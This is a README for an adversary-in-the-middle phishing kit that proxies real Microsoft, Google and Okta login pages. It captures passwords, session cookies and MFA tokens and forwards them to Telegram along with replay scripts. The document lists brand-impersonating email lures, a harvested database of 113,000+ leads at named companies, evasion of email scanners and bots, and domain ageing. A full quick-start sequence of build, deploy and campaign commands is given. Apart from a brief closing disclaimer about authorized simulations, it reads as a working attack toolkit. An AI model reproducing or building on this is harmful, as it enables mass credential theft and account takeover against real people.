# GLNT Phish Kit — AiTM Reverse Proxy Framework

> **STRASSER ⛫ LAB** | Classification: Internal | Version: 1.3 | June 2026

A production-grade, Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy for authorized phishing simulations. The victim sees the **real** Microsoft/Google/Okta login page proxied through your domain. Credentials, session cookies, and MFA tokens are captured and delivered to Telegram with replay-ready scripts. No fake landing page — undetectable by DOM comparison.

## Architecture

```
Victim clicks link → Cloudflare Worker (TLS) → EC2 proxy-server (Go) → Real Login
                                                   │
                    ┌──────────────────────────────┼──────────┐
                    │                              │          │
              Bootloader           Body/Location rewriting   Telegram
              (decrypts fragment,  All upstream hosts        🔴 FULL CAPTURE
               sets cookies)       rewritten to our domain   + .txt with cookies
                                                             (1 alert per victim)
```

### Multi-Host Domain Setup (v1.3)

With multi-host phishlet support, only **3 subdomains** needed for 4+ identity providers:

| Subdomain | Phishlet | Handles |
|-----------|----------|---------|
| `auth.<domain>` | microsoft-personal | login.live.com + login.microsoftonline.com |
| `accounts.<domain>` | google | accounts.google.com |
| `idp.<domain>` | okta | *.okta.com |

See `docs/domain-architecture.md` (MD + PDF) for full deployment guide.

## Current State — What's Built

### Live Infrastructure (glnt.cc — now burned)
- EC2 proxy-server running for 7+ days continuously
- Cloudflare Worker deployed (TLS, origin IP hidden, bot blocking)
- Analytics dashboard with campaign funnel, live polling
- 4 phishlets: Microsoft 365, Microsoft Personal (Outlook/Hotmail/Live), Google Workspace, Okta SSO

### Attack Pipeline
- `prompt=login` forces fresh authentication even with existing browser cookies
- `/r` redirect hop hides the phishing URL from basic email scanners (base64url-encoded)
- CDN routing forwards `/ests/` and `/shared/` paths to Microsoft's actual CDN
- **Single Telegram notification per victim** — only on MFA completion (not 3 alerts)
- All events (page_load, credential_submit, mfa_complete) still logged to JSONL for analytics
- Cookie replay script auto-generated and attached to Telegram .txt files
- Email-named capture files (user_at_domain_com-session.txt)
- Multi-host phishlet support — handles cross-host redirect flows (login.live.com → login.microsoftonline.com → office.com)
- `UpstreamHosts` field enables one phishlet to proxy multiple upstream hosts, reducing required subdomains

### Email Lures — 20 Templates + SVG Branding + Outlook Safety
- **10 email body lures:** shared-document, invoice-payment, meeting-invite, security-alert, voicemail, hr-document, it-support, contract-signature, expense-report, package-delivery
- **10 attachment lures:** DocuSign, Adobe Sign, Dropbox, SharePoint, OneDrive, Teams, Excel, Google Docs, Zoom, Stripe
- **Brand-authentic redesign (v1.2):** Each lure has a unique layout matching the real brand's email design language
- **Inline SVG logo marks:** Every lure has a brand-specific SVG icon — two-person silhouettes (Teams), payment card (Stripe), cloud (OneDrive), camera (Zoom), etc.
- **Outlook/MSO safety:** All 10 lures have `[if mso]` SVG fallbacks, VML `v:roundrect` CTA buttons, and no email-unsafe CSS
- **QA-verified:** 10/10 PASS after 2 rounds of subagent testing and fixes
- **Research-backed:** Real-format document IDs, brand-appropriate security language, contextual urgency per brand, staged interaction verbiage
- All wired with `{LINK}` and `{RECIPIENT_NAME}`/`##victimemail##` placeholders
- SuperMailer-ready (HTML Source tab → paste → send)
- `scripts/build-campaign-email.sh` automates link insertion

### Lead Generation & Verification
- **113,000+ leads** across 163 companies, 30+ industries, 6 continents
- All MX-verified + DNS-verified with per-company CSVs
- `~/.glnt-data/leads/master_leads.csv` — master database (112,710 emails)
- `~/.glnt-data/leads/master_leads_verified.csv` — DNS-verified output with status columns
- `~/.glnt-data/leads/leads/*.csv` — individual company files ready for SuperMailer import
- **Email verifier CLI tool** (`email-verifier/`) — syntax, disposable, MX, catch-all, SMTP validation pipeline
- DNS-only verification: ~20 minutes for 113K leads
- SMTP verification with SOCKS5 proxy support for deliverability confirmation
- Perf fix: removed per-domain mutex (was serializing SMTP checks, dropped runtime from 3h to 14min)

### Evilginx 3 Interoperability
- **Template-based YAML exporter** (`scripts/json2evilginx/`) — generates correct Evilginx 3.9.9 phishlets
- 3 reference templates (Microsoft 451 lines, Google 206, Okta 362) built from real Evilginx schema
- Sections: proxy_hosts, sub_filters, auth_tokens, credentials, js_inject, force_post, intercept
- Generated exports in `exports/evilginx/` for all 4 phishlets

### OpSec Hardening
- JS symbols obfuscated (no `AES_KEY_B64`, `decryptAESGCM`, `lure` strings)
- URL fragment delivery — payload never sent in HTTP, invisible to scanners
- AES-256-GCM with random prefix — no static `mv=`/`bXY9` signature
- Bot UA blocking (14 crawler patterns)
- Rate limiting (10 req/min per IP)
- Custom 404 handler (not Go default)
- No plaintext credentials in server logs

## Quick Start

```bash
# 1. Generate encryption key
cd payload-generator && go run keygen.go
# Copy the base64 key

# 2. Set key in bootloader
# Edit proxy-server/bootloader.html
# Set: const _k = '<your-key>';

# 3. Set phishlet hostname
# Edit proxy-server/phishlets/microsoft.json
# Change "hostname" to "login.your-domain.com"

# 4. Build and start proxy
cd ../proxy-server
go build -o proxy-srv .
TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." ./proxy-srv

# 5. Start analytics (optional)
cd ../analytics-server
go build -o analytics-srv .
./analytics-srv --data ../data/captures.jsonl --port 9092 --token "strong-token"

# 6. Deploy CDN fronting
cd ../cdn-config
# Edit wrangler.toml with your domain
npx wrangler login && npx wrangler deploy

# 7. Generate a campaign link
cd ../payload-generator
go run . --key <key> --email victim@company.com \
  --redirect "https://login.microsoftonline.com/common/oauth2/authorize?client_id=CLIENT_ID&redirect_uri=https://login.your-domain.com&response_type=code&prompt=login" \
  --campaign my-campaign

# 8. Build campaign emails
cd ../scripts
./build-campaign-email.sh shared-document "https://your-domain.com/#<fragment>" "John" email.html

# 9. Verify leads before campaign
cd ../email-verifier
go build -o email-verifier .
./email-verifier --input ../~/.glnt-data/leads/master_leads.csv --output ../~/.glnt-data/leads/master_leads_verified.csv

# 10. Export Evilginx phishlets (optional)
cd ..
go run ./scripts/json2evilginx --all
# Outputs to exports/evilginx/
```

## Components

| Component | Directory | Purpose |
|-----------|-----------|---------|
| Proxy Server | `proxy-server/` | AiTM reverse proxy, single Telegram alert on MFA, bootloader, 4 phishlets |
| Payload Generator | `payload-generator/` | AES-256-GCM encrypted lure URL generation |
| Analytics Server | `analytics-server/` | Campaign dashboard, JSONL event tracking, funnel analytics |
| CDN Config | `cdn-config/` | Cloudflare Worker reverse proxy, bot blocking at edge |
| Email Verifier | `email-verifier/` | Go CLI for batch email validation (syntax/DNS/SMTP) |
| Email Lures | `lures/`, `campaign-emails/` | 20 HTML templates with SVG logos + MSO fallbacks, SuperMailer-ready |
| Lead Database | `data/` | 113K+ leads, MX-verified + DNS-verified |
| Evilginx Export | `scripts/json2evilginx/`, `exports/evilginx/` | Template-based JSON→Evilginx 3.9.9 YAML converter |
| Domain Architecture | `docs/domain-architecture.md` + PDF | Multi-host deployment guide with diagrams |
| Playbook | `docs/playbook/` | Full operations guide in MD, HTML, PDF |
| Scripts | `scripts/` | Campaign email builder, URL generation, obfuscation |

## Planned Next Steps

- [ ] **Domain rotation** — register batch of `.cc` domains, age 2-3 weeks before deployment
- [ ] **MailScope desktop app** — Windows email verification GUI (Go + Wails + Svelte), spec at `/Users/sk_hga/mailscope/docs/superpowers/specs/`
- [ ] **Multi-domain deployment script** — one-command deploy to new domain with all configs updated
- [ ] **Automated campaign manager** — web UI for building campaign emails, tracking open rates, managing lures
- [ ] **credential_submit Telegram fallback** — optional alert if victim submits creds but abandons before MFA (configurable timeout)

## Requirements

- Go 1.22+ (proxy-server, payload-generator, analytics-server, email-verifier)
- Node.js 18+ (cdn-config — Cloudflare Wrangler)
- Cloudflare account (for CDN fronting)
- Telegram bot (for capture notifications)
- SuperMailer or similar bulk email software (for campaign delivery)

## Warning

This is a security research and education tool. Use only for authorized
phishing simulations, penetration testing, and red team operations with
explicit written authorization.
